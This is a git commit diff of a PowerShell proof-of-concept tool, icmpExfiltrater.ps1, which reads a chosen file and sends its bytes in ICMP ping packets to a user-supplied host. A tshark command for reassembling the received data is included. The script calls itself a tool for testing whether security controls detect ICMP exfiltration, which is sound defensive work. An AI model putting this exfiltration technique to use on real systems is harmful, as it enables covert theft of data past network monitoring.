e7941c8f6f3f5a5a54591260cccf92f9dc16ac8d
Aaron Truax <40522390+cyb3rw01f@users.noreply.github.com>
2020-05-19 21:19:58 -0500

    Updated Code

--- icmpExfiltrater.ps1
+++ icmpExfiltrater.ps1
@@ -1,24 +1,21 @@
 <#                             
-Author of icmpExfiltrater script @cyberw01f
-Last updated 6/24/2018
+Author of icmpExfiltrater.ps1 script @cyb3rw01f
+Last updated 05/19/2020
 
 .SYNOPSIS 
 This is a Proof of Concept. This file is for testing purposes only. Malicious use of this script is prohibitted. 
 
 .DESCRIPTION
-Exfiltrate selected data file using ICMP protocol. 
+Exfiltrate selected data file using the ICMP protocol. 
 
-.Notes
-I developed this script to assist testing security controls ability to detect/alert based on data exfiltration using the ICMP protocol. 
+This script can assist testing security controls ability to detect/alert based on data exfiltration using the ICMP protocol. 
 This is very slow and noisy so it is highly suggested that only small files are used for testing.
 
-On the receiving end run a tcpdump/tshark session to capture the incoming ICMP data. Once the transfer is complete you can use the below tshark command to extract the data back to its normal form. 
+On the receiving end run a tcpdump/tshark session to capture the incoming ICMP data. Once the transfer is complete you 
+can use the below tshark command to extract the data back to its normal form. 
 
 Using Tshark to extract the paylod from the icmp data field. 
-tshark -r icmp.pcap -Y ip.src==24.245.91.87 -T fields -e data | xxd -r -p > data2
-
-Future plan:
-In the future I plan to develop a server componenet that will listen for the incoming data and auto extract it
+tshark -r icmp.pcap -Y ip.src==8.8.8.8 -T fields -e data | xxd -r -p > data2
 #>
 
 $logo = @"
@@ -26,30 +23,29 @@ $logo = @"
 			                                     ___  _  __ 
 			 ___ _   _| |__   ___ _ ____      __/ _ \/ |/ _|
 			/ __| | | | '_ \ / _ \ '__\ \ /\ / / | | | | |_ 
-		        | (__| |_| | |_) |  __/ |   \ V  V /| |_| | |  _|
+		   | (__| |_| | |_) |  __/ |   \ V  V /| |_| | |  _|
 			\___|\__, |_.__/ \___|_|    \_/\_/  \___/|_|_|  
-				|___/                                      
+				 |___/                                      
 		
 	==================================================================
-               *     *    *     /\__/\  *    ---    *
-                   *            /      \    /     \    
-                        *   *  |  -  -  |  |       |*   
-                 *   __________| \     /|  |       |    
-                   /              \ T / |   \     /    
-                 /                      |  *  ---
-                |  ||     |    |       /             *
-                |  ||    /______\     / |*     *
+                                 /\__/\ 
+                                /      \ 
+                               |  -  -  |
+                     __________| \     /|
+                   /              \ T / |
+                 /                      |
+                |  ||     |    |       /  
+                |  ||    /______\     / |
                 |  | \  |  /     \   /  |
                  \/   | |\ \      | | \ \
                       | | \ \     | |  \ \
                       | |  \ \    | |   \ \
-                      '''   '''   '''    '''									   
-			     @cyberw01f
+                      '''   '''   '''    ' 
+			               @cyberw01f
 "@
 $label = @"          
                       ICMP Data Exfiltrater
-  Data used with this script is to be used only for testing security controls
-                  Responsible use only is spermited
+            Script is to be used for testing purposes
 "@
 
 
@@ -79,7 +75,7 @@ else {
     Exit
 }
 
-#nl var simply does a carrage return / new line
+#nl variable simply does a carrage return / new line
 $nl = [Environment]::NewLine
  
 }
@@ -91,8 +87,5 @@ $destination = read-host "PING Destination Doamin or IP address"
 Get-File
 $bytes = [System.Text.Encoding]::ASCII.GetBytes($data)
 $PingObj = New-Object System.Net.NetworkInformation.ping
-###############################################################################
-# Edit the string "Domain or IP" to include the reciving client
-###############################################################################
 ForEach ($line in $bytes) {$PingAnswer = $PingObj.Send("$destination", 1000, $line);} 
 Write-Host "$_" $PingAnswer.Status;
